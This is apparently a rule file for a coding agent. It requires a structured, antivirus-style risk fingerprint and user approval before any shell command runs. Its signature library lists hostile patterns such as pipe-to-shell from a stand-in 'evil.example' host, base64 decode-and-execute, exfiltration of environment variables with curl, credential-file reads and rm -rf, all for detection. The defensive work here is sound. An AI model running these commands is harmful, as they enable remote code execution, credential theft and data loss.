---
name: verbose-permissions
description: >
  Behavioral fingerprinting before command execution. Decompose every proposed
  command into a structured AV-style fingerprint before requesting permission.
  Modeled after antivirus heuristic output — structured, machine-parseable,
  signature-matched metadata about what a command WILL do before it runs.
applies_to:
  - Bash tool
  - any shell command execution
  - script invocations
  - package manager commands
  - git operations
trigger: PreToolUse on Bash
---

# Verbose Permission Fingerprinting — MANDATORY

NEVER execute a command without first producing a structured behavioral fingerprint.
This rule applies to every invocation of the Bash tool or any shell command execution.

## The Enforcement Model

`CLAUDE.md` is advisory. It competes for context window. It can be forgotten.
The PreToolUse hook is the enforcement layer — it runs outside the model context
and cannot be crowded out or overridden by a clever prompt.

This rule instructs the MODEL what to emit before requesting permission.
The hook (`claude-code/hooks/verbose-permissions-check.sh`) enforces the same
decomposition mechanically.

## MANDATORY: Behavioral Fingerprint Format

Before requesting permission to run ANY command, read the command in full and
emit this structured fingerprint. No exceptions. No shortcuts for "simple" commands.

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PERMISSION REQUEST — Behavioral Fingerprint
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Service:     [what service or daemon is being invoked]
Program:     [the binary, interpreter, or package manager being called]
Directory:   [target paths being read, written, created, or deleted]
Network:     [any outbound connections, domains, ports, or data exfil]
Privileges:  [sudo, setuid, capability escalations, or elevated access]
Signatures:  [pattern-match results against risky behavior heuristics — see below]
Risk Level:  [LOW | MEDIUM | HIGH | CRITICAL]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

Each field is REQUIRED. If a field is not applicable, write `none` — never omit it.

## Field Definitions

### Service
What high-level service or function is being invoked?
Examples: `package installation`, `source control`, `build system`, `container runtime`,
`code execution`, `network fetch`, `file system modification`

### Program
The actual binary or interpreter being called.
Examples: `npm (Node.js package manager)`, `git (version control)`, `bash (shell interpreter)`,
`python3 (Python interpreter)`, `docker (container runtime)`, `curl (HTTP client)`

### Directory
All filesystem paths that will be READ, WRITTEN, CREATED, or DELETED.
Be specific. `node_modules/` is not specific — name the package and path.
If writing to /tmp, flag it. If writing outside the project root, flag it.

### Network
Any outbound TCP/UDP connections. Include:
- Domain or IP being contacted
- Port number
- Protocol (HTTP/HTTPS/DNS/etc.)
- Whether TLS is used
- Whether data is being uploaded (not just downloaded)

If no network activity: `none`

### Privileges
Any privilege escalation:
- `sudo` — full root
- `setuid` — specific elevated binary
- `chmod 777` or `chmod +x` — permission widening
- `chown` — ownership change
- Docker socket access — equivalent to root
- Writing to system directories (`/etc`, `/usr`, `/bin`)

If no privilege escalation: `none`

### Signatures
Pattern-match results from heuristic checks. This is the AV signature engine equivalent.
For each match, output: `[RULE-ID] pattern matched — description`
If no matches: `none`

See "Heuristic Signature Library" below for the full rule set.

### Risk Level
Aggregate risk based on the most severe finding:
- **LOW** — read-only, no network, no privilege escalation, known safe tool
- **MEDIUM** — network fetch (HTTPS, read-only), standard package install, writes within project
- **HIGH** — writes outside project root, network fetch with pipe to shell, chmod escalation
- **CRITICAL** — curl|bash, base64 decode + exec, rm -rf, sudo with broad scope, writes to system dirs

## Heuristic Signature Library

These are the pattern-match rules applied to every command.

### SIG-001: Pipe-to-Shell (CRITICAL)
Triggers on: `curl ... | bash`, `curl ... | sh`, `wget ... | bash`, `wget ... | sh`,
`curl ... | python`, `fetch ... | node`
Risk: Executes arbitrary remote code without inspection. Supply chain attack vector.

### SIG-002: Base64 Decode-and-Execute (CRITICAL)
Triggers on: `base64 -d ... | bash`, `base64 --decode ... | sh`, `echo <b64> | base64 -d | sh`,
`python -c "import base64; exec(...)"`, `eval(atob(...))`
Risk: Obfuscates payload to evade review. Common in post-exploitation chains.

### SIG-003: Write to /tmp + Execute (HIGH)
Triggers on: commands that write to `/tmp/` AND then `chmod +x` or execute the written file.
Risk: Classic dropper pattern. `/tmp` is world-writable and often noexec-bypassed.

### SIG-004: Recursive Force Delete (HIGH)
Triggers on: `rm -rf`, `rm -fr`, `rmdir --ignore-fail-on-non-empty`
Risk: Irreversible data destruction. No recycle bin. No undo.

### SIG-005: Permission Widening (MEDIUM–HIGH)
Triggers on: `chmod 777`, `chmod a+rwx`, `chmod o+w`, `chmod +s` (setuid/setgid bit)
Risk: Opens files to world-write or installs a setuid binary.

### SIG-006: Sudo Invocation (MEDIUM–HIGH)
Triggers on: `sudo <anything>`, `su - root`
Risk: Root privilege escalation. Severity depends on what follows sudo.

### SIG-007: Docker Socket Access (HIGH)
Triggers on: `-v /var/run/docker.sock`, `--privileged`, `-v /:/`
Risk: Docker socket = root. Host filesystem mount = host escape.

### SIG-008: Git Force Push (MEDIUM)
Triggers on: `git push --force`, `git push -f`, `git push --force-with-lease`
Risk: Rewrites remote history. Can destroy others' work on shared branches.

### SIG-009: Unversioned Package Install (MEDIUM)
Triggers on: `npm install <pkg>` without `@version`, `pip install <pkg>` without `==version`,
`npx -y <pkg>`, `npx --yes <pkg>`
Risk: Pulls unverified latest version. Vulnerable to version-hijack attacks.

### SIG-010: Write Outside Project Root (MEDIUM)
Triggers on: writes to absolute paths not under the current working directory.
Risk: Unexpected system modification. Could overwrite configs, binaries, or data.

### SIG-011: curl/wget to Sensitive Destination (HIGH)
Triggers on: downloads to `/etc/`, `/usr/`, `/bin/`, `/sbin/`, `/lib/`
Risk: Overwrites system files with arbitrary remote content.

### SIG-012: Environment Variable Exfiltration (CRITICAL)
Triggers on: `curl ... -d "$(env)"`, `curl ... --data-urlencode "$(printenv)"`,
piping env output to any network destination
Risk: Leaks all environment variables including secrets and tokens.

### SIG-013: History/Credential File Read (HIGH)
Triggers on: reading `~/.bash_history`, `~/.zsh_history`, `~/.aws/credentials`,
`~/.ssh/id_*`, `~/.netrc`, `~/.gitconfig` with tokens
Risk: Credential harvesting.

### SIG-014: Encoded Command Execution (HIGH)
Triggers on: `bash -c "$(echo ... | base64 -d)"`, `python -c "exec(compile(...))"`,
`node -e "eval(Buffer.from('...','base64').toString())"`,
`powershell -EncodedCommand`
Risk: Obfuscated execution. Cannot be reviewed at face value.

## Special Rules

### NEVER run obfuscated commands without full decode
If a command uses encoding (base64, hex, rot13, URL encoding) to obscure its payload:
1. DECODE the payload first
2. Run the fingerprint on the DECODED command
3. Include both the original and decoded forms in the fingerprint
4. Set Signatures to include SIG-002 and SIG-014
5. Risk Level is always at minimum HIGH for any obfuscated command

### NEVER skip the fingerprint for "short" commands
A one-line command can be just as dangerous as a 20-line script.
`curl https://evil.example/payload | sh` is five words.
Length is not a proxy for safety.

### Scripts must be read before execution
If the Bash tool is about to execute a `.sh`, `.py`, or other script file:
1. READ the script contents first using the Read tool
2. Apply the fingerprint to the full script contents
3. Call out any lines that match the signature library
4. Aggregate the risk level across all matched signatures

### External scripts require CRITICAL review
If the script is fetched from the network (curl, wget, pip, npm, etc.) and
cannot be read before execution (e.g., piped directly):
- Risk Level is automatically CRITICAL
- Explain this to the user explicitly
- Do NOT proceed without explicit user confirmation

## What Happens After the Fingerprint

1. Emit the full fingerprint (all 7 fields)
2. State: "Permission requested to run the above command."
3. Wait for explicit user approval before calling the Bash tool
4. If the user approves, run the command and report results
5. If Risk Level is CRITICAL, add: "This command has critical risk signatures.
   Are you sure you want to proceed?"

NEVER use the fingerprint as a formality and then run anyway.
The fingerprint IS the trust gate. User approval after seeing the fingerprint is consent.
